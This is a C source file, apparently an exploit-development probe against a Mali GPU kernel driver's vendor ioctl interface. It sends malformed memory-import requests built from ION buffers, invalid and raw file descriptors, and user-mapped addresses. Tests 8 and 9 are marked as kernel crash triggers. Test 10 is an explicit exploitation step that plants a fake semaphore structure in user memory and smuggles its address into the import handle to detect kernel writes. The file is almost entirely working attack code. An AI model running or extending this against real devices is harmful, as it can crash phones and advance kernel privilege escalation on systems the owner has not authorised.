/*
 * mali_safe_probe.c — Ultra-cautious single-test Mali vendor dispatch probe
 * 
 * Run with argument number to select test. Each test is fork-isolated.
 * Tests are ordered from safest to most dangerous.
 *
 * 0 = handshake only (no import)
 * 1 = standard import via 'M' correct ptr-to-fd (baseline)
 * 2 = vendor 0x80 import phandle=0 type=1 (NULL, safest vendor test)
 * 3 = vendor 0x80 import phandle=0 type=2 (NULL, type variation)
 * 4 = vendor 0x80 import phandle=0xFFFFFFFF type=1 (invalid fd, high)
 * 5 = vendor 0x80 import phandle=mapped_addr type=1 (no valid fd)
 * 6 = vendor 0x80 import phandle=mapped_addr type=2 (no valid fd)
 * 7 = vendor 0x80 import ptr-to-fd (correct) type=2 (is vendor same as std?)
 * 8 = vendor 0x80 raw_fd type=2 (DANGEROUS if vendor treats as ptr)
 * 9 = vendor 0x80 raw_fd type=1 (DANGEROUS - original crash trigger)
 * 10 = vendor 0x80 low=valid_fd high=mapped_addr (exploitation test)
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>

struct uk_header { uint32_t id; uint32_t ret; };

static int make_cmd(int magic, int sz) {
    return _IOC(3, magic, 0, sz);
}

static int ion_alloc_fd(void) {
    int ion = open("/dev/ion", O_RDONLY | O_CLOEXEC);
    if (ion < 0) return -1;
    /* ARM32: size_t=4, ion_user_handle_t=ptr=4. Total 20 bytes */
    struct {
        uint32_t len;           /* size_t */
        uint32_t align;         /* size_t */
        uint32_t heap_id_mask;
        uint32_t flags;
        uint32_t handle;        /* ion_user_handle_t (ptr) */
    } alloc = {4096, 4096, 1, 0, 0};
    /* ION_IOC_ALLOC = _IOWR('I', 0, 20) = 0xC0144900 */
    int r = ioctl(ion, 0xC0144900, &alloc);
    if (r < 0 || alloc.handle == 0) {
        fprintf(stderr, "  ION alloc failed: r=%d errno=%d handle=%u\n", r, errno, alloc.handle);
        close(ion); return -1;
    }
    fprintf(stderr, "  ION alloc OK: handle=0x%x\n", alloc.handle);

    /* ION_IOC_SHARE = _IOWR('I', 4, 8) = 0xC0084904 */
    struct { uint32_t handle; int32_t fd; } share = { alloc.handle, -1 };
    r = ioctl(ion, 0xC0084904, &share);
    close(ion);
    if (r < 0 || share.fd < 0) {
        fprintf(stderr, "  ION share failed: r=%d errno=%d fd=%d\n", r, errno, share.fd);
        return -1;
    }
    fprintf(stderr, "  ION share OK: fd=%d\n", share.fd);
    return share.fd;
}

static int mali_open_and_handshake(int hs_magic) {
    int fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
    if (fd < 0) return -1;
    uint8_t hb[16];
    memset(hb, 0, 16);
    ((struct uk_header *)hb)->id = 0; hb[8] = 10;
    int r1 = ioctl(fd, make_cmd(hs_magic, 16), hb);
    uint32_t ver_id = ((struct uk_header *)hb)->id;
    uint32_t ver_ret = ((struct uk_header *)hb)->ret;
    fprintf(stderr, "  handshake version: ioctl=%d id=%u ret=%u\n", r1, ver_id, ver_ret);

    memset(hb, 0, 16);
    ((struct uk_header *)hb)->id = 530;
    int r2 = ioctl(fd, make_cmd(hs_magic, 16), hb);
    uint32_t sf_id = ((struct uk_header *)hb)->id;
    uint32_t sf_ret = ((struct uk_header *)hb)->ret;
    fprintf(stderr, "  handshake setflags: ioctl=%d id=%u ret=%u\n", r2, sf_id, sf_ret);

    if (r1 < 0 || r2 < 0) { close(fd); return -1; }
    return fd;
}

static void hexdump(uint8_t *buf, int len) {
    for (int i = 0; i < len; i++) {
        if (i % 16 == 0) fprintf(stderr, "    ");
        fprintf(stderr, "%02x ", buf[i]);
        if (i % 16 == 15) fprintf(stderr, "\n");
    }
    if (len % 16) fprintf(stderr, "\n");
}

static void do_import(int mali_fd, int import_magic, uint8_t *buf) {
    fprintf(stderr, "  sending import ioctl (magic=0x%x, size=48)...\n", import_magic);
    fprintf(stderr, "  request:\n");
    hexdump(buf, 48);
    fflush(stderr);

    int r = ioctl(mali_fd, make_cmd(import_magic, 48), buf);
    int e = errno;
    fprintf(stderr, "  ioctl returned: %d (errno=%d)\n", r, e);
    fprintf(stderr, "  response hdr: id=%u ret=%u\n",
            *(uint32_t *)(buf + 0), *(uint32_t *)(buf + 4));
    fprintf(stderr, "  response:\n");
    hexdump(buf, 48);
}

/* ===== TEST FUNCTIONS ===== */

static void test0(void) {
    fprintf(stderr, "TEST 0: Handshake only (0x80 magic)\n");
    int fd = mali_open_and_handshake(0x80);
    if (fd >= 0) {
        fprintf(stderr, "  handshake OK, fd=%d\n", fd);
        close(fd);
    }
}

static void test1(void) {
    fprintf(stderr, "TEST 1: Standard import via 'M' (correct, ptr-to-fd)\n");
    int fd = mali_open_and_handshake('M');
    if (fd < 0) return;
    int dma_fd = ion_alloc_fd();
    fprintf(stderr, "  dma_fd=%d\n", dma_fd);
    fflush(stderr);
    if (dma_fd < 0) { close(fd); return; }

    uint8_t buf[48];
    memset(buf, 0, 48);
    *(uint32_t *)(buf + 0) = 513;                 /* MEM_IMPORT */
    *(uint64_t *)(buf + 8) = (uintptr_t)&dma_fd;  /* ptr to fd */
    *(uint32_t *)(buf + 16) = 2;                   /* type=UMM */
    *(uint64_t *)(buf + 24) = 0x0000000F;          /* flags: CPU_R + CPU_W + GPU_R + GPU_W */
    /* NOTE: Do NOT set bit 30 (0x40000000 = BASE_MEM_SECURE) - triggers TrustZone crash */

    do_import(fd, 'M', buf);
    fprintf(stderr, "  import done, closing dma_fd...\n");
    fflush(stderr);
    close(dma_fd);
    fprintf(stderr, "  dma_fd closed, closing mali_fd...\n");
    fflush(stderr);
    close(fd);
    fprintf(stderr, "  all closed OK\n");
    fflush(stderr);
}

static void test2(void) {
    fprintf(stderr, "TEST 2: Vendor 0x80 import, phandle=0, type=1\n");
    int fd = mali_open_and_handshake(0x80);
    if (fd < 0) return;

    uint8_t buf[48];
    memset(buf, 0, 48);
    *(uint32_t *)(buf + 0) = 513;
    /* phandle = 0 */
    *(uint32_t *)(buf + 16) = 1;

    do_import(fd, 0x80, buf);
    close(fd);
}

static void test3(void) {
    fprintf(stderr, "TEST 3: Vendor 0x80 import, phandle=0, type=2\n");
    int fd = mali_open_and_handshake(0x80);
    if (fd < 0) return;

    uint8_t buf[48];
    memset(buf, 0, 48);
    *(uint32_t *)(buf + 0) = 513;
    *(uint32_t *)(buf + 16) = 2;

    do_import(fd, 0x80, buf);
    close(fd);
}

static void test4(void) {
    fprintf(stderr, "TEST 4: Vendor 0x80 import, phandle=0xFFFFFFFF, type=1\n");
    int fd = mali_open_and_handshake(0x80);
    if (fd < 0) return;

    uint8_t buf[48];
    memset(buf, 0, 48);
    *(uint32_t *)(buf + 0) = 513;
    *(uint32_t *)(buf + 8) = 0xFFFFFFFF;  /* invalid fd number */
    *(uint32_t *)(buf + 16) = 1;

    do_import(fd, 0x80, buf);
    close(fd);
}

static void test5(void) {
    fprintf(stderr, "TEST 5: Vendor 0x80 import, phandle=0x100000 (mapped), type=1\n");
    int fd = mali_open_and_handshake(0x80);
    if (fd < 0) return;

    uint32_t addr = 0x100000;
    void *m = mmap((void *)(uintptr_t)addr, 0x10000,
                   PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (m == MAP_FAILED) { fprintf(stderr, "  mmap failed\n"); close(fd); return; }
    /* Fill with semaphore pattern */
    for (uint32_t off = 0; off < 0x10000; off += 16) {
        uint32_t *p = (uint32_t *)((char *)m + off);
        p[0] = 0; p[1] = 1;
        p[2] = addr + off + 8; p[3] = addr + off + 8;
    }
    fprintf(stderr, "  mapped fake struct at %p\n", m);

    uint8_t buf[48];
    memset(buf, 0, 48);
    *(uint32_t *)(buf + 0) = 513;
    *(uint32_t *)(buf + 8) = addr;  /* phandle = mapped addr (not a valid fd) */
    *(uint32_t *)(buf + 16) = 1;

    do_import(fd, 0x80, buf);

    /* Check for modifications */
    int mods = 0;
    for (uint32_t off = 0; off < 0x10000; off += 16) {
        uint32_t *p = (uint32_t *)((char *)m + off);
        if (p[0] != 0 || p[1] != 1 || p[2] != addr + off + 8 || p[3] != addr + off + 8) {
            fprintf(stderr, "  MOD@%x: %x %u %x %x\n", addr+off, p[0], p[1], p[2], p[3]);
            mods++;
        }
    }
    fprintf(stderr, "  total modifications: %d\n", mods);

    munmap(m, 0x10000);
    close(fd);
}

static void test6(void) {
    fprintf(stderr, "TEST 6: Vendor 0x80 import, phandle=0x100000 (mapped), type=2\n");
    int fd = mali_open_and_handshake(0x80);
    if (fd < 0) return;

    uint32_t addr = 0x100000;
    void *m = mmap((void *)(uintptr_t)addr, 0x10000,
                   PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (m == MAP_FAILED) { close(fd); return; }
    memset(m, 0, 0x10000);

    uint8_t buf[48];
    memset(buf, 0, 48);
    *(uint32_t *)(buf + 0) = 513;
    *(uint32_t *)(buf + 8) = addr;
    *(uint32_t *)(buf + 16) = 2;

    do_import(fd, 0x80, buf);

    int mods = 0;
    for (uint32_t off = 0; off < 0x10000; off += 4)
        if (*(uint32_t *)((char *)m + off) != 0) mods++;
    fprintf(stderr, "  modifications: %d\n", mods);

    munmap(m, 0x10000);
    close(fd);
}

static void test7(void) {
    fprintf(stderr, "TEST 7: Vendor 0x80 import, ptr-to-fd phandle (correct), type=2\n");
    int fd = mali_open_and_handshake(0x80);
    if (fd < 0) return;
    int dma_fd = ion_alloc_fd();
    fprintf(stderr, "  dma_fd=%d\n", dma_fd);
    if (dma_fd < 0) { close(fd); return; }

    uint8_t buf[48];
    memset(buf, 0, 48);
    *(uint32_t *)(buf + 0) = 513;
    *(uint64_t *)(buf + 8) = (uintptr_t)&dma_fd;
    *(uint32_t *)(buf + 16) = 2;
    *(uint64_t *)(buf + 24) = 0x0000000F;

    do_import(fd, 0x80, buf);
    close(dma_fd);
    close(fd);
}

static void test8(void) {
    fprintf(stderr, "TEST 8: *** DANGEROUS *** Vendor 0x80 raw_fd, type=2\n");
    fprintf(stderr, "  This may crash the kernel!\n");
    int fd = mali_open_and_handshake(0x80);
    if (fd < 0) return;
    int dma_fd = ion_alloc_fd();
    fprintf(stderr, "  dma_fd=%d\n", dma_fd);
    if (dma_fd < 0) { close(fd); return; }

    uint8_t buf[48];
    memset(buf, 0, 48);
    *(uint32_t *)(buf + 0) = 513;
    *(uint64_t *)(buf + 8) = (uint64_t)dma_fd;
    *(uint32_t *)(buf + 16) = 2;

    do_import(fd, 0x80, buf);
    close(dma_fd);
    close(fd);
}

static void test9(void) {
    fprintf(stderr, "TEST 9: *** DANGEROUS *** Vendor 0x80 raw_fd, type=1\n");
    fprintf(stderr, "  This is the original crash trigger!\n");
    int fd = mali_open_and_handshake(0x80);
    if (fd < 0) return;
    int dma_fd = ion_alloc_fd();
    fprintf(stderr, "  dma_fd=%d\n", dma_fd);
    if (dma_fd < 0) { close(fd); return; }

    uint8_t buf[48];
    memset(buf, 0, 48);
    *(uint32_t *)(buf + 0) = 513;
    *(uint64_t *)(buf + 8) = (uint64_t)dma_fd;
    *(uint64_t *)(buf + 16) = 1;

    do_import(fd, 0x80, buf);
    close(dma_fd);
    close(fd);
}

static void test10(void) {
    fprintf(stderr, "TEST 10: Exploitation — low=valid_fd, high=mapped_sem_addr\n");
    int fd = mali_open_and_handshake(0x80);
    if (fd < 0) return;
    int dma_fd = ion_alloc_fd();
    fprintf(stderr, "  dma_fd=%d\n", dma_fd);
    if (dma_fd < 0) { close(fd); return; }

    uint32_t fake_addr = 0x100000;
    void *m = mmap((void *)(uintptr_t)fake_addr, 0x10000,
                   PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (m == MAP_FAILED) { close(dma_fd); close(fd); return; }
    for (uint32_t off = 0; off < 0x10000; off += 16) {
        uint32_t *p = (uint32_t *)((char *)m + off);
        p[0] = 0; p[1] = 1;
        p[2] = fake_addr + off + 8; p[3] = fake_addr + off + 8;
    }
    fprintf(stderr, "  fake sem mapped at 0x%x\n", fake_addr);

    uint8_t buf[48];
    memset(buf, 0, 48);
    *(uint32_t *)(buf + 0) = 513;
    *(uint32_t *)(buf + 8) = dma_fd;      /* low: valid fd */
    *(uint32_t *)(buf + 12) = fake_addr;  /* high: mapped address */
    *(uint64_t *)(buf + 16) = 1;

    fprintf(stderr, "  phandle: low=0x%x high=0x%x full=0x%llx\n",
            dma_fd, fake_addr, *(uint64_t *)(buf + 8));

    do_import(fd, 0x80, buf);

    /* Check semaphore modifications */
    int mods = 0;
    for (uint32_t off = 0; off < 0x10000; off += 16) {
        uint32_t *p = (uint32_t *)((char *)m + off);
        if (p[0] != 0 || p[1] != 1 ||
            p[2] != fake_addr + off + 8 || p[3] != fake_addr + off + 8) {
            fprintf(stderr, "  MOD@%x: lock=%x count=%u next=%x prev=%x\n",
                    fake_addr + off, p[0], p[1], p[2], p[3]);
            mods++;
            if (mods >= 5) break;
        }
    }
    fprintf(stderr, "  total sem modifications: %d\n", mods);

    munmap(m, 0x10000);
    close(dma_fd);
    close(fd);
}

int main(int argc, char **argv) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <test_num>\n", argv[0]);
        fprintf(stderr, "  0  = handshake only\n");
        fprintf(stderr, "  1  = std import 'M' (safe baseline)\n");
        fprintf(stderr, "  2  = vendor phandle=0 type=1\n");
        fprintf(stderr, "  3  = vendor phandle=0 type=2\n");
        fprintf(stderr, "  4  = vendor phandle=0xFFFFFFFF type=1\n");
        fprintf(stderr, "  5  = vendor phandle=mapped type=1\n");
        fprintf(stderr, "  6  = vendor phandle=mapped type=2\n");
        fprintf(stderr, "  7  = vendor ptr-to-fd type=2\n");
        fprintf(stderr, "  8  = DANGER: vendor raw_fd type=2\n");
        fprintf(stderr, "  9  = DANGER: vendor raw_fd type=1 (crash)\n");
        fprintf(stderr, "  10 = EXPLOIT: low=fd high=mapped\n");
        return 1;
    }

    int test = atoi(argv[1]);
    void (*tests[])(void) = {
        test0, test1, test2, test3, test4, test5, test6, test7,
        test8, test9, test10
    };
    int n_tests = sizeof(tests) / sizeof(tests[0]);

    if (test < 0 || test >= n_tests) {
        fprintf(stderr, "Invalid test number %d\n", test);
        return 1;
    }

    fprintf(stderr, "=== Mali Safe Probe (test %d) ===\n", test);
    fprintf(stderr, "PID=%d UID=%d\n", getpid(), getuid());
    fflush(stderr);

    pid_t pid = fork();
    if (pid == 0) {
        alarm(10);
        tests[test]();
        fflush(stderr);
        _exit(0);
    }

    int status;
    waitpid(pid, &status, 0);
    if (WIFSIGNALED(status)) {
        fprintf(stderr, "*** KILLED by signal %d ***\n", WTERMSIG(status));
    } else {
        fprintf(stderr, "Exited: %d\n", WEXITSTATUS(status));
    }
    return 0;
}
